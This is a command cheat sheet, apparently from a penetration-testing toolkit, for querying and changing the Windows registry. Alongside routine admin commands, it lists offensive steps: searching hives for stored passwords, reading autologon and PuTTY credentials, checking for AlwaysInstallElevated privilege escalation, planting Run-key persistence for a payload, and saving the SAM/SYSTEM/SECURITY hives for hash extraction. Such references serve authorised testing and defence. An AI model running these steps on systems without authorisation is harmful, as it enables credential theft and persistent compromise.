# Windows Registry
> Query, search, modify, and delete the Windows registry over an SSH/WinRM shell — PowerShell cmdlets (HKLM:/HKCU: drives or `Registry::HKEY_*`) and `reg.exe`. Search/copy here, run it in the Windows session.

<!-- tags: windows,registry,reg,powershell -->

## query registry key reg
Dump a key's values with reg.exe (cmd-friendly, works everywhere).

```bash
reg query {{KEYPATH:str:HKLM\SOFTWARE\7-Zip}}
```

<!-- meta: risk=low | phase=enum | tags=registry,reg,query -->

---

## query registry value reg
Read one specific value under a key.

```bash
reg query "{{KEYPATH:str:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion}}" /v {{VALUE:str:ProductName}}
```

<!-- meta: risk=low | phase=enum | tags=registry,reg,query,value -->

---

## query registry recursive reg
Recurse a whole subtree (every subkey and value) with reg.exe.

```bash
reg query {{KEYPATH:str:HKLM\SOFTWARE\Microsoft}} /s
```

<!-- meta: risk=low | phase=enum | tags=registry,reg,recursive -->

---

## read registry key values powershell
Read all values of a key via PowerShell (Registry:: provider path).

```bash
Get-ItemProperty -Path Registry::{{KEYPATH:str:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}
```

<!-- meta: risk=low | phase=enum | tags=registry,powershell,run -->

---

## read registry value powershell
Read a single value with Get-ItemProperty -Name.

```bash
Get-ItemProperty -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion}} -Name {{VALUE:str:ProgramFilesDir}}
```

<!-- meta: risk=low | phase=enum | tags=registry,powershell,value -->

---

## list registry value names powershell
List just the value NAMES under a key (no data).

```bash
Get-Item -Path Registry::{{KEYPATH:str:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}} | Select-Object -ExpandProperty Property
```

<!-- meta: risk=low | phase=enum | tags=registry,powershell,names -->

---

## list registry subkeys recursive powershell
Walk a key and all of its subkeys recursively.

```bash
Get-ChildItem -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion}} -Recurse
```

<!-- meta: risk=low | phase=enum | tags=registry,powershell,recursive -->

---

## list registry subkeys powershell
List immediate subkeys of a key (one level).

```bash
Get-ChildItem -Path {{KEYPATH:str:HKLM:\SOFTWARE}}
```

<!-- meta: risk=low | phase=enum | tags=registry,powershell,subkeys -->

---

## search registry for passwords reg
Recursively search a hive for a pattern in value data (great for stored creds).

```bash
reg query {{HIVE:str:HKLM}} /f "{{PATTERN:str:password}}" /t REG_SZ /s
```

<!-- meta: risk=low | phase=post | tags=registry,reg,creds,search -->

---

## search registry key names reg
Search for a pattern in KEY names only (/k), recursively.

```bash
reg query {{HIVE:str:HKCU}} /f "{{PATTERN:str:Password}}" /t REG_SZ /s /k
```

<!-- meta: risk=low | phase=post | tags=registry,reg,search -->

---

## find winlogon autologon creds reg
Read Winlogon DefaultUserName / DefaultPassword — cleartext autologon creds when set.

```bash
reg query "{{KEYPATH:str:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon}}" /v {{VALUE:str:DefaultPassword}}
```

<!-- meta: risk=low | phase=post | tags=registry,creds,autologon -->

---

## find putty saved sessions reg
Enumerate saved PuTTY sessions (hostnames, usernames, proxy creds).

```bash
reg query {{KEYPATH:str:HKCU\Software\SimonTatham\PuTTY\Sessions}} /s
```

<!-- meta: risk=low | phase=post | tags=registry,creds,putty -->

---

## check alwaysinstallelevated reg
Both keys = 1 means any user can install MSIs as SYSTEM (privesc).

```bash
reg query {{KEYPATH:str:HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer}} /v {{VALUE:str:AlwaysInstallElevated}}; reg query {{KEYPATH_HKCU:str:HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer}} /v {{VALUE:str:AlwaysInstallElevated}}
```

<!-- meta: risk=low | phase=enum | tags=registry,privesc,alwaysinstallelevated -->

---

## list installed software reg
Enumerate installed programs from the Uninstall keys.

```bash
Get-ChildItem -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall}} | ForEach-Object { Get-ItemProperty $_.PSPath } | Select-Object DisplayName, DisplayVersion
```

<!-- meta: risk=low | phase=enum | tags=registry,software,enum -->

---

## create registry key powershell
Create a new key (use -Force to not error if it exists).

```bash
New-Item -Path {{KEYPATH:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey}} -Force
```

<!-- meta: risk=med | phase=post | tags=registry,powershell,create -->

---

## create registry key reg
Create a new key with reg.exe.

```bash
reg add "{{KEYPATH:str:HKCU\SOFTWARE\MyKey}}" /f
```

<!-- meta: risk=med | phase=post | tags=registry,reg,create -->

---

## add registry value powershell
Add a typed value to a key (String/DWord/Binary via -PropertyType).

```bash
New-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\MyKey}} -Name {{VALUE:str:access}} -PropertyType String -Value "{{DATA:str:value}}" -Force
```

<!-- meta: risk=med | phase=post | tags=registry,powershell,value -->

---

## add registry value reg
Set a value with reg.exe (/t type, /d data, /f to overwrite).

```bash
reg add "{{KEYPATH:str:HKCU\SOFTWARE\MyKey}}" /v {{VALUE:str:access}} /t REG_SZ /d "{{DATA:str:value}}" /f
```

<!-- meta: risk=med | phase=post | tags=registry,reg,value -->

---

## modify registry value powershell
Change the data of an existing value.

```bash
Set-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\MyKey}} -Name {{VALUE:str:access}} -Value "{{DATA:str:newvalue}}"
```

<!-- meta: risk=med | phase=post | tags=registry,powershell,modify -->

---

## add run persistence reg
Drop a Run value so a payload launches at every user logon.

```bash
reg add "{{KEYPATH:str:HKCU\Software\Microsoft\Windows\CurrentVersion\Run}}" /v {{VALUE:str:Updater}} /t REG_SZ /d "{{DATA:str:C:\Windows\Temp\payload.exe}}" /f
```

<!-- meta: risk=high | phase=post | tags=registry,persistence,run -->

---

## add runonce persistence powershell
RunOnce value — payload runs once at the next logon, then is removed.

```bash
New-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce}} -Name {{VALUE:str:access}} -PropertyType String -Value "{{DATA:str:C:\Windows\Temp\payload.exe}}" -Force
```

<!-- meta: risk=high | phase=post | tags=registry,persistence,runonce -->

---

## list run keys all hives powershell
Show every Run-key autorun across HKLM + HKCU at once.

```bash
Get-ItemProperty -Path {{KEYPATH:str:HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}, {{KEYPATH_HKCU:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run}}
```

<!-- meta: risk=low | phase=enum | tags=registry,persistence,autoruns -->

---

## delete registry value powershell
Remove a single value from a key.

```bash
Remove-ItemProperty -Path {{KEYPATH:str:HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey}} -Name {{VALUE:str:access}}
```

<!-- meta: risk=med | phase=post | tags=registry,powershell,delete,cleanup -->

---

## delete registry value reg
Delete a value with reg.exe.

```bash
reg delete "{{KEYPATH:str:HKCU\SOFTWARE\MyKey}}" /v {{VALUE:str:access}} /f
```

<!-- meta: risk=med | phase=post | tags=registry,reg,delete,cleanup -->

---

## delete registry key powershell
Delete a key and everything under it.

```bash
Remove-Item -Path {{KEYPATH:str:HKCU:\SOFTWARE\MyKey}} -Recurse
```

<!-- meta: risk=med | phase=post | tags=registry,powershell,delete -->

---

## delete registry key reg
Delete a key (and subkeys) with reg.exe.

```bash
reg delete "{{KEYPATH:str:HKCU\SOFTWARE\MyKey}}" /f
```

<!-- meta: risk=med | phase=post | tags=registry,reg,delete -->

---

## export registry key reg
Export a key to a .reg file (backup before tampering, or exfil config).

```bash
reg export {{KEYPATH:str:HKLM\SOFTWARE\Microsoft}} {{OUTFILE:file:out.reg}}
```

<!-- meta: risk=low | phase=post | tags=registry,reg,export,backup -->

---

## save sam system hives reg
Dump the SAM + SYSTEM hives for offline credential extraction (needs SYSTEM).

```bash
reg save HKLM\SAM {{OUTFILE:file:C:\Windows\Temp\sam.save}}; reg save HKLM\SYSTEM {{OUTFILE_SYSTEM:file:C:\Windows\Temp\system.save}}; reg save HKLM\SECURITY {{OUTFILE_SECURITY:file:C:\Windows\Temp\security.save}}
```

<!-- meta: risk=high | phase=post | tags=registry,creds,sam,hashdump -->
